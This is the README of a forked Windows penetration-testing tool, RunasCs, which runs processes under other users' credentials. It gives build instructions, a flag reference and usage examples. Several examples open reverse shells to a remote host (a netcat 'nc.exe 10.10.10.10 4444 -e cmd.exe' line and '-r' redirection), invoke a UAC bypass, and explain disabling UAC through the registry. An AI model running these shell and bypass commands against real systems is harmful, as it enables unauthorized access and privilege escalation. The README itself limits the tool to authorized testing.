<div align="center">

# RunasCs

**An improved, open source alternative to Windows' built in `runas.exe` for running processes as another user with explicit credentials**

![License](https://img.shields.io/github/license/01xJB/RunasCs?color=blue&style=for-the-badge)
![Framework](https://img.shields.io/badge/.NET%20Framework-4.7.2-512BD4?style=for-the-badge&logo=dotnet&logoColor=white)
![Language](https://img.shields.io/badge/language-C%23-239120?style=for-the-badge&logo=csharp&logoColor=white)
![Status](https://img.shields.io/badge/status-maintained%20fork-brightgreen?style=for-the-badge)

</div>

---

> ## Fork Notice
> This is a maintained fork of the original [RunasCs](https://github.com/antonioCoco/RunasCs) by [@splinter_code (antonioCoco)](https://github.com/antonioCoco). All credit for the tool itself, its design, and its Windows API usage belongs to the original author and the contributors credited below. This fork exists because the upstream build instructions no longer work on a current toolchain, see [What Changed In This Fork](#what-changed-in-this-fork) for the fix. The tool's behavior, flags, and output are unchanged from upstream.

## Overview

*RunasCs* is a utility to run specific processes with different permissions than the user's current logon provides, using explicit credentials. It is an improved and open version of the Windows built in *runas.exe* that solves some of its limitations:

* Allows explicit credentials
* Works both when spawned from an interactive process and from a service process
* Manages properly the *DACL* for *Window Stations* and *Desktop* for the creation of the new process
* Uses more reliable process creation functions like `CreateProcessAsUser()` and `CreateProcessWithTokenW()` when the calling process holds the required privileges (automatic detection)
* Allows specifying the logon type, e.g. 8-NetworkCleartext logon (no *UAC* limitations)
* Allows bypassing UAC when an administrator password is known (flag `--bypass-uac`)
* Allows creating a process with the main thread impersonating the requested user (flag `--remote-impersonation`)
* Allows redirecting *stdin*, *stdout*, and *stderr* to a remote host
* It's open source

*RunasCs* automatically detects the best process creation function for the current context. Based on the calling process token's permissions, it uses one of the following in preferred order:

1. `CreateProcessAsUserW()`
2. `CreateProcessWithTokenW()`
3. `CreateProcessWithLogonW()`

> ## Authorized Use Only
> RunasCs runs processes under alternate credentials and can bypass UAC token filtering. Only use it on systems you own or are explicitly authorized to test, such as a signed penetration test scope or your own lab. Unauthorized use of alternate credentials or UAC bypass techniques against systems you don't control is illegal in most jurisdictions.

## What Changed In This Fork

The upstream repository builds with a single line pointing directly at the in box `csc.exe` compiler, with no explicit assembly references:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
```

On a current Windows install this now fails with a cascade of `CS0234`/`CS0246` errors for types like `System.Net`, `Win32Exception`, `AddressFamily`, and `Process`, because nothing is telling the compiler where to find `System.dll`, and the compiler that ships in the .NET Framework install path only understands language features up to C# 5.

The source code itself did not need any logic changes, it needed a real build definition. This fork replaces the bare `csc.exe` one liner with a proper Visual Studio project (`RunasCs.sln` / `RunasCs.csproj`) targeting .NET Framework 4.7.2, with the required assembly reference declared explicitly, so MSBuild resolves everything correctly instead of relying on whatever the compiler happened to auto reference.

One real tradeoff worth knowing about: upstream's `compile_commands.txt` supported compiling two variants, one against the .NET Framework 4.0 compiler and one against 2.0, for broader compatibility with very old Windows targets. This fork only builds a single .NET Framework 4.7.2 target. If you need a binary that runs on a machine with a much older .NET Framework runtime, you will need to retarget `RunasCs.csproj` yourself.

## Requirements

**To build:**
* Visual Studio 2019 or later (Community edition works fine), or the standalone Build Tools for Visual Studio with the .NET Framework 4.7.2 targeting pack

**To run the compiled `RunasCs.exe`:**
* .NET Framework 4.7.2 or later on the target machine

## Build

```bash
git clone https://github.com/01xJB/RunasCs.git
cd RunasCs
```

**Using the Visual Studio IDE:**

1. Open `RunasCs.sln`
2. Set the configuration to `Release`
3. Build → Build Solution (`Ctrl+Shift+B`)
4. The compiled binary is written to `bin\Release\RunasCs.exe`

**Using MSBuild from the command line** (Developer Command Prompt for VS, or Build Tools installed standalone):

```bash
msbuild RunasCs.sln /p:Configuration=Release
```

## Usage

```console
RunasCs v1.5 - @splinter_code

Usage:
    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]

Description:
    RunasCs is an utility to run specific processes under a different user account
    by specifying explicit credentials. In contrast to the default runas.exe command
    it supports different logon types and CreateProcess* functions to be used, depending
    on your current permissions. Furthermore it allows input/output redirection (even
    to remote hosts) and you can specify the password directly on the command line.

Positional arguments:
    username                username of the user
    password                password of the user
    cmd                     commandline for the process

Optional arguments:
    -d, --domain domain
                            domain of the user, if in a domain.
                            Default: ""
    -f, --function create_process_function
                            CreateProcess function to use. When not specified
                            RunasCs determines an appropriate CreateProcess
                            function automatically according to your privileges.
                            0 - CreateProcessAsUserW
                            1 - CreateProcessWithTokenW
                            2 - CreateProcessWithLogonW
    -l, --logon-type logon_type
                            the logon type for the token of the new process.
                            Default: "2" - Interactive
    -t, --timeout process_timeout
                            the waiting time (in ms) for the created process.
                            This will halt RunasCs until the spawned process
                            ends and sent the output back to the caller.
                            If you set 0 no output will be retrieved and a
                            background process will be created.
                            Default: "120000"
    -r, --remote host:port
                            redirect stdin, stdout and stderr to a remote host.
                            Using this option sets the process_timeout to 0.
    -p, --force-profile
                            force the creation of the user profile on the machine.
                            This will ensure the process will have the
                            environment variables correctly set.
                            WARNING: If non-existent, it creates the user profile
                            directory in the C:\Users folder.
    -b, --bypass-uac
                            try a UAC bypass to spawn a process without
                            token limitations (not filtered).
    -i, --remote-impersonation
                            spawn a new process and assign the token of the
                            logged on user to the main thread.

Examples:
    Run a command as a local user
        RunasCs.exe user1 password1 "cmd /c whoami /all"
    Run a command as a domain user and logon type as NetworkCleartext (8)
        RunasCs.exe user1 password1 "cmd /c whoami /all" -d domain -l 8
    Run a background process as a local user,
        RunasCs.exe user1 password1 "C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe" -t 0
    Redirect stdin, stdout and stderr of the specified command to a remote host
        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
    Run a command simulating the /netonly flag of runas.exe
        RunasCs.exe user1 password1 "cmd /c whoami /all" -l 9
    Run a command as an Administrator bypassing UAC
        RunasCs.exe adm1 password1 "cmd /c whoami /priv" --bypass-uac
    Run a command as an Administrator through remote impersonation
        RunasCs.exe adm1 password1 "cmd /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation
```

The two processes (calling and called) communicate through one *pipe* (both for *stdout* and *stderr*). The default logon type is 2 (*Interactive*).

By default, the *Interactive* (2) logon type is restricted by *UAC*, and the token generated from this authentication is filtered. You can allow interactive logons without this restriction by setting the following registry key to 0 and restarting the server:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
```

Otherwise, try the flag **--bypass-uac** to attempt to bypass the token filtering limitation.

**NetworkCleartext (8)** logon type has the widest permissions, since it isn't filtered by UAC in local tokens and still allows authentication over the network, as it stores credentials in the authentication package. If you hold enough privileges, prefer this logon type through `--logon-type 8`.

By default, the calling process (*RunasCs*) waits until the spawned process finishes. If you need to spawn a background or async process, for example a reverse shell, set `-t timeout` to `0`. In that case *RunasCs* won't wait for the spawned process to finish.

## References

* [Potatoes and tokens](https://decoder.cloud/2018/01/13/potato-and-tokens/)
* [Starting an Interactive Client Process in C++](https://docs.microsoft.com/en-us/previous-versions/aa379608(v=vs.85))
* [Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
* [Interactive Services](https://learn.microsoft.com/en-us/windows/win32/services/interactive-services)
* [What is up with "The application failed to initialize properly (0xc0000142)" error?](https://blogs.msdn.microsoft.com/winsdk/2015/06/03/what-is-up-with-the-application-failed-to-initialize-properly-0xc0000142-error/)
* [Getting an Interactive Service Account Shell](https://www.tiraniddo.dev/2020/02/getting-interactive-service-account.html)
* [Reading Your Way Around UAC (Part 1)](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html)
* [Reading Your Way Around UAC (Part 2)](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-2.html)
* [Reading Your Way Around UAC (Part 3)](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-3.html)
* [Vanara - A set of .NET libraries for Windows implementing PInvoke calls to many native Windows APIs with supporting wrappers](https://github.com/dahall/Vanara)

## Credits

Original tool by [@splinter_code (antonioCoco)](https://github.com/antonioCoco). Upstream credits:

* [@decoder](https://github.com/decoder-it)
* [@qtc-de](https://github.com/qtc-de)
* [@winlogon0](https://twitter.com/winlogon0)

## License

Released under [GPL-3.0](LICENSE), same as upstream.

---

<div align="center">

Fork maintained by [**01xJB**](https://github.com/01xJB)

</div>
